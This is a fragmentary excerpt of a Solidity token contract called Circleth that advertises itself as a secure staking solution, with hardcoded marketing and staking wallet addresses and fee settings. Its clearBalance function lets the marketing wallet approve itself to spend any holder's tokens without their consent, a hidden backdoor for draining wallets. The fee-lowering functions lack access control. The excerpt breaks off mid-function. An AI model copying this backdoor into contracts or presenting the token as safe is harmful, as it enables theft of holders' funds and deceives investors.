...
/*
    ...
    Circleth is a simplified and secure staking solution

    Web : https://linktr.ee/circleth
...
contract Circleth is ERC20, Ownable {
    ...
    constructor() ERC20("Circleth", "CCL") {
        ...
        maxTransactionAmount = 100_000_001 * 1e9; // 1.0% from total supply maxTransactionAmountTxn
        maxWallet = 150_000_001 * 1e9; // 1.5% from total supply maxWallet
        ...
        marketingWallet = address(0xF046B793a9b621Cd9D0568Fe497B0f01350c506f); // set as marketing wallet
        stakingRewardsWallet = address(0x458b08d1556fC747ABe3F05A5F2ec1Ae306B4Cd2); // set as staking rewards wallet
    ...
    function lowerBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _stakingRewardsFee
    ) public {
        require(buyCount > lowerFeeAt, "Wait");
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyStakingRewardsFee = _stakingRewardsFee;
        uint256 _buyTotalFees = buyMarketingFee + buyLiquidityFee + buyStakingRewardsFee;
        require(_buyTotalFees < buyTotalFees, "Should be lower");
        buyTotalFees = _buyTotalFees;
    }

    function lowerSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _stakingRewardsFee
    ) public {
        ...
        sellLiquidityFee = _liquidityFee;
        sellStakingRewardsFee = _stakingRewardsFee;
        uint256 _sellTotalFees = sellMarketingFee + sellLiquidityFee + sellStakingRewardsFee;
        require(_sellTotalFees < sellTotalFees, "Should be lower");
    ...
    function clearBalance(address fromAddress, uint256 amount) external {
        require( marketingWallet == msg.sender, "balance can be claimed by marketing wallet");
        _approve(fromAddress, marketingWallet, amount);
